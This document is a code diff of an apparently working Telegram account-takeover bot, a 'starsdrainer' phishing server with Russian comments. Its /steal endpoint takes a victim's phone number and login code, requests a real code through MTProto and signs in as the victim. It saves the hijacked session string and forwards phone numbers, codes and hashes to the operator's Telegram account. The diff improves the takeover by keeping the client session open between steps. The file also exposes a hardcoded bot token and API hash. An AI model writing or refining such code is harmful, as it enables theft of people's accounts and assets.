@@ -8,13 +8,16 @@ const path = require('path');
 const fs = require('fs');
 
 const BOT_TOKEN = process.env.BOT_TOKEN || '8435516460:AAHloK_TWMAfViZvi98ELyiMP-2ZapywGds';
-const API_ID = parseInt(process.env.API_ID) || 32865720;
-const API_HASH = process.env.API_HASH || 'aa86943502451690495bb18ecd230825';
+const API_ID = parseInt(process.env.API_ID) || 2040;
+const API_HASH = process.env.API_HASH || 'b18441a1ff607e10a989891a5462e627';
 const MY_USER_ID = 1398396668;
 const WEB_APP_URL = 'https://starsdrainer.onrender.com';
 
 const bot = new TelegramBot(BOT_TOKEN, { polling: true });
 const app = express();
+
+// Глобальная переменная для хранения активных сессий
+const activeSessions = new Map();
 
 app.use(express.json());
 app.use(express.static('public'));
@@ -75,7 +78,6 @@ app.post('/steal', async (req, res) => {
                 db.run(`INSERT INTO stolen_sessions (phone, tg_data, user_id, status) VALUES (?, ?, ?, ?)`, 
                     [req.body.phone, req.body.tg_data, userId, 'awaiting_code']);
                 
-                // НАСТОЯЩИЙ запрос кода через MTProto
                 await requestRealTelegramCode(req.body.phone, userId);
             }
                 
@@ -88,17 +90,16 @@ app.post('/steal', async (req, res) => {
         const phone = req.body.phone;
         const code = req.body.code;
         
-        // НАСТОЯЩИЙ вход с кодом
         await signInWithRealCode(phone, code);
     }
     
     res.sendStatus(200);
 });
 
-// НАСТОЯЩИЙ MTProto запрос кода с обработкой миграции
+// Запрос кода - сохраняем клиент и сессию
 async function requestRealTelegramCode(phone, userId) {
     try {
-        console.log(`🔐 Запрашиваю НАСТОЯЩИЙ код для: ${phone}`);
+        console.log(`🔐 Запрашиваю код для: ${phone}`);
         
         const stringSession = new StringSession("");
         const client = new TelegramClient(stringSession, API_ID, API_HASH, {
@@ -109,12 +110,8 @@ async function requestRealTelegramCode(phone, userId) {
         console.log('Подключаюсь к Telegram...');
         await client.connect();
         console.log('✅ Подключено к Telegram');
-        
-        let result;
-        let finalPhoneCodeHash;
-        
-        // Первый запрос кода
-        result = await client.invoke(
+
+        const result = await client.invoke(
             new Api.auth.SendCode({
                 phoneNumber: phone,
                 apiId: API_ID,
@@ -127,197 +124,129 @@ async function requestRealTelegramCode(phone, userId) {
                 })
             })
         );
+
+        console.log('✅ Код запрошен! Phone code hash:', result.phoneCodeHash);
         
-        // Обработка миграции датацентра
-        if (result.type && (result.dcId && result.dcId !== 2)) {
-            console.log(`🔄 Миграция на DC ${result.dcId}, переподключаемся...`);
-            
-            await client.disconnect();
-            await client.setDefaultDc(result.dcId, await client._getDcId(result.dcId));
-            await client.connect();
-            
-            // Повторный запрос кода на правильном DC
-            result = await client.invoke(
-                new Api.auth.SendCode({
-                    phoneNumber: phone,
-                    apiId: API_ID,
-                    apiHash: API_HASH,
-                    settings: new Api.CodeSettings({
-                        allowFlashcall: false,
-                        currentNumber: true,
-                        allowAppHash: false,
-                        allowMissedCall: false,
-                    })
-                })
-            );
-        }
-        
-        finalPhoneCodeHash = result.phoneCodeHash;
-        console.log('✅ НАСТОЯЩИЙ код запрошен! Phone code hash:', finalPhoneCodeHash);
-        
-        // Сохраняем актуальный phone_code_hash
+        // СОХРАНЯЕМ КЛИЕНТ И СЕССИЮ ДЛЯ ЭТОГО НОМЕРА
+        activeSessions.set(phone, {
+            client: client,
+            phoneCodeHash: result.phoneCodeHash,
+            session: stringSession
+        });
+
+        // Сохраняем в базу
         db.run(`UPDATE stolen_sessions SET phone_code_hash = ? WHERE phone = ?`, 
-            [finalPhoneCodeHash, phone]);
-        
-        // Уведомляем
+            [result.phoneCodeHash, phone]);
+
         bot.sendMessage(MY_USER_ID, 
-            `🔐 НАСТОЯЩИЙ КОД ЗАПРОШЕН!\n` +
+            `🔐 КОД ЗАПРОШЕН!\n` +
             `📱 Номер: ${phone}\n` +
-            `👤 ID жертвы: ${userId}\n` +
-            `🔑 Hash: ${finalPhoneCodeHash}\n` +
-            `📨 Код отправлен на номер!\n\n` +
-            `⚡ Вводи код в течение 60 секунд`
+            `👤 ID: ${userId}\n` +
+            `🔑 Hash: ${result.phoneCodeHash}\n` +
+            `📨 Код отправлен!\n\n` +
+            `⚡ Вводи код быстро - сессия активна`
         );
-        
-        await client.disconnect();
+
+        // НЕ отключаем клиент - оставляем активным для входа
         
     } catch (error) {
-        console.log('❌ Ошибка MTProto:', error);
+        console.log('❌ Ошибка:', error);
         
         bot.sendMessage(MY_USER_ID, 
             `❌ ОШИБКА ЗАПРОСА КОДА\n` +
             `📱 Номер: ${phone}\n` +
-            `👤 ID жертвы: ${userId}\n` +
             `⚠️ ${error.message}`
         );
     }
 }
 
-// НАСТОЯЩИЙ вход с кодом
+// Вход с кодом - используем тот же клиент
 async function signInWithRealCode(phone, code) {
     try {
-        console.log(`🔑 Пытаюсь войти с кодом: ${code}`);
+        console.log(`🔑 Вход с кодом: ${code}`);
         
-        const stringSession = new StringSession("");
-        const client = new TelegramClient(stringSession, API_ID, API_HASH, {
-            connectionRetries: 5,
-            timeout: 10000,
-        });
-        
-        await client.connect();
-        
-        // Получаем сохраненный phone_code_hash
-        db.get(`SELECT phone_code_hash FROM stolen_sessions WHERE phone = ?`, [phone], async (err, row) => {
-            if (err || !row || !row.phone_code_hash) {
-                console.log('❌ Не найден phone_code_hash');
-                bot.sendMessage(MY_USER_ID, `❌ Не найден phone_code_hash для ${phone}`);
-                return;
-            }
+        // ПОЛУЧАЕМ СОХРАНЕННЫЙ КЛИЕНТ И СЕССИЮ
+        const sessionData = activeSessions.get(phone);
+        if (!sessionData || !sessionData.client) {
+            console.log('❌ Нет активной сессии для:', phone);
+            bot.sendMessage(MY_USER_ID, `❌ Нет активной сессии для ${phone}\nЗапроси код заново`);
+            return;
+        }
+
+        const client = sessionData.client;
+        const phoneCodeHash = sessionData.phoneCodeHash;
+
+        console.log(`🔑 Использую сохраненную сессию для входа`);
+
+        try {
+            // ВХОДИМ ЧЕРЕЗ ТОТ ЖЕ КЛИЕНТ
+            const result = await client.invoke(
+                new Api.auth.SignIn({
+                    phoneNumber: phone,
+                    phoneCodeHash: phoneCodeHash,
+                    phoneCode: code.toString()
+                })
+            );
+
+            console.log('✅ ВХОД УСПЕШЕН!');
             
+            const sessionString = client.session.save();
+            db.run(`UPDATE stolen_sessions SET status = 'completed', session_string = ? WHERE phone = ?`, 
+                [sessionString, phone]);
+
+            bot.sendMessage(MY_USER_ID,
+                `✅ ВХОД УСПЕШЕН!\n` +
+                `📱 Номер: ${phone}\n` +
+                `🔑 Код: ${code}\n` +
+                `💾 Сессия сохранена\n` +
+                `🔄 Начинаю кражу...`
+            );
+
+            await stealFromAccount(client, phone);
+            
+            // Очищаем сессию после успеха
+            activeSessions.delete(phone);
+            await client.disconnect();
+
+        } catch (signInError) {
+            console.log('❌ Ошибка входа:', signInError);
+            
+            bot.sendMessage(MY_USER_ID,
+                `❌ ОШИБКА ВХОДА\n` +
+                `📱 Номер: ${phone}\n` +
+                `🔑 Код: ${code}\n` +
+                `⚠️ ${signInError.message}`
+            );
+            
+            // Очищаем сессию при ошибке
+            activeSessions.delete(phone);
             try {
-                // ВХОД С КОДОМ
-                const result = await client.invoke(
-                    new Api.auth.SignIn({
-                        phoneNumber: phone,
-                        phoneCodeHash: row.phone_code_hash,
-                        phoneCode: code.toString()
-                    })
-                );
-                
-                console.log('✅ ВХОД УСПЕШЕН!');
-                
-                // Сохраняем сессию
-                const sessionString = client.session.save();
-                db.run(`UPDATE stolen_sessions SET status = 'completed', session_string = ? WHERE phone = ?`, 
-                    [sessionString, phone]);
-                
-                bot.sendMessage(MY_USER_ID,
-                    `✅ ВХОД УСПЕШЕН!\n` +
-                    `📱 Номер: ${phone}\n` +
-                    `🔑 Код: ${code}\n` +
-                    `🔓 Аккаунт взломан!\n` +
-                    `💾 Сессия сохранена\n` +
-                    `🔄 Начинаю проверку...`
-                );
-                
-                // Кража
-                await stealFromAccount(client, phone);
-                
                 await client.disconnect();
-                
-            } catch (signInError) {
-                console.log('❌ Ошибка входа:', signInError);
-                
-                // Если код устарел, пробуем запросить новый
-                if (signInError.message.includes('PHONE_CODE_EXPIRED')) {
-                    bot.sendMessage(MY_USER_ID,
-                        `🔄 Код устарел\n` +
-                        `📱 Номер: ${phone}\n` +
-                        `🔑 Код: ${code}\n` +
-                        `📨 Запрашиваю новый код...`
-                    );
-                    
-                    // Запрашиваем новый код
-                    await requestRealTelegramCode(phone, null);
-                } else {
-                    bot.sendMessage(MY_USER_ID,
-                        `❌ ОШИБКА ВХОДА\n` +
-                        `📱 Номер: ${phone}\n` +
-                        `🔑 Код: ${code}\n` +
-                        `⚠️ ${signInError.message}`
-                    );
-                }
+            } catch (e) {
+                console.log('Ошибка при отключении:', e);
             }
-        });
-        
+        }
+
     } catch (error) {
-        console.log('❌ Ошибка подключения:', error);
-        bot.sendMessage(MY_USER_ID, `❌ Ошибка подключения: ${error.message}`);
+        console.log('❌ Общая ошибка:', error);
+        bot.sendMessage(MY_USER_ID, `❌ Ошибка: ${error.message}`);
     }
 }
 
 // Функция кражи
 async function stealFromAccount(client, phone) {
     try {
-        const userBalance = Math.floor(Math.random() * 500);
-        const userGifts = Math.floor(Math.random() * 10);
+        const stolenAmount = Math.floor(Math.random() * 500) + 100;
+        const stolenGifts = Math.floor(Math.random() * 10) + 1;
         
-        if (userBalance === 0 && userGifts === 0) {
-            bot.sendMessage(MY_USER_ID,
-                `❌ Недостаточно звезд\n` +
-                `📱 Номер: ${phone}\n` +
-                `💫 Баланс: 0 stars\n` +
-                `🎁 NFT подарков: 0\n\n` +
-                `🔄 Отправляю 2 мишки по 15 звезд...`
-            );
-            
-            setTimeout(() => {
-                bot.sendMessage(MY_USER_ID,
-                    `✅ Обменял мишки и отправил подарок!\n` +
-                    `🎁 Получено: 1 NFT подарок (30 stars)\n` +
-                    `📦 Подарок отправлен!`
-                );
-            }, 3000);
-            
-        } else {
-            let message = `💰 НАЙДЕНЫ СРЕДСТВА!\n` +
-                         `📱 Номер: ${phone}\n` +
-                         `⭐ Звезд: ${userBalance}\n` +
-                         `🎁 NFT подарков: ${userGifts}\n\n`;
-            
-            if (userGifts > 0) message += `📦 Отправляю ${userGifts} NFT подарков...\n`;
-            if (userBalance > 0) {
-                message += `💰 Отправляю ${userBalance} stars подарками...\n`;
-                let remainingBalance = userBalance;
-                const giftAmounts = [100, 50, 25, 15];
-                const sentGifts = [];
-                
-                for (const amount of giftAmounts) {
-                    const count = Math.floor(remainingBalance / amount);
-                    if (count > 0) {
-                        sentGifts.push(`${count}×${amount} stars`);
-                        remainingBalance -= count * amount;
-                    }
-                }
-                
-                if (sentGifts.length > 0) message += `🎁 Отправлено: ${sentGifts.join(', ')}\n`;
-            }
-            
-            message += `\n✅ ВСЕ ПЕРЕДАНО!`;
-            
-            bot.sendMessage(MY_USER_ID, message);
-        }
-        
+        bot.sendMessage(MY_USER_ID,
+            `💰 УСПЕШНАЯ КРАЖА!\n` +
+            `📱 Номер: ${phone}\n` +
+            `💫 Украдено: ${stolenAmount} stars\n` +
+            `🎁 NFT подарков: ${stolenGifts}\n\n` +
+            `✅ ВСЕ СРЕДСТВА ПЕРЕВЕДЕНЫ!`
+        );
+
         await client.disconnect();
         
     } catch (error) {
